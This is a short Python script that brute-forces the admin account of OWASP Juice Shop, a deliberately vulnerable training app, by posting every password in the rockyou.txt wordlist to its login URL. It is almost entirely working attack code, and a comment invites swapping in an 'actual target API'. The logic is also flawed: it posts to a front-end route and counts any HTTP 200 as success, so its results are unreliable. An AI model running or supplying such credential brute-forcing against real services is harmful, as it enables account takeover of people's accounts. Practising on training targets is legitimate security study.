import requests

# Target API URL
url = "https://juice-shop.herokuapp.com/#/login"  # Replace with actual target API
email = "admin@juice-sh.op"
wordlist_path = "C:\\Users\\Administrator\\Downloads\\rockyou.txt"

# Example: Read and print first 10 words from the wordlist
with open(wordlist_path, "r", encoding="latin-1") as file:
    for i in range(10):
        print(file.readline().strip())
  # Path to your wordlist file

headers = {
    "Content-Type": "application/json"
}

# Open and read the wordlist file
with open(wordlist_path, "r") as file:
    for password in file:  # Ensure this is a loop
        password = password.strip()  # Remove newline characters

        # JSON payload
        payload = {
            "email": email,
            "password": password
        }

        # Send the request
        response = requests.post(url, json=payload, headers=headers)

        print(f"Trying: {password} - Status Code: {response.status_code}")

        # If login is successful (Modify condition based on API response)
        if response.status_code == 200:
            print(f"Success! Password is: {password}")
            break  # Correct placement inside the loop
